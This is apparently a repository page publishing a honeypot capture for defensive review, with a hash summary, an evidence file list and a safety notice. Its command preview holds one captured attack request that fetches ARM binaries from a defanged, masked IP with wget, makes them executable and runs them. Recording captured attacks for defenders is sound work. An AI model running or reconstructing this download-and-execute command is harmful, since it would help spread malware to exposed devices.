# ca6db0332a11d8c1cdbd6638c383c218e647a2c3546df3146e8ca33cf6f968f4

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `ca6db0332a11d8c1cdbd6638c383c218e647a2c3546df3146e8ca33cf6f968f4` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/94[.]154[.]43[.]XXX/arm7;chmod+777+arm7;./arm7;wget+http:/\/94[.]154[.]43[.]XXX/arm6;chmod
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
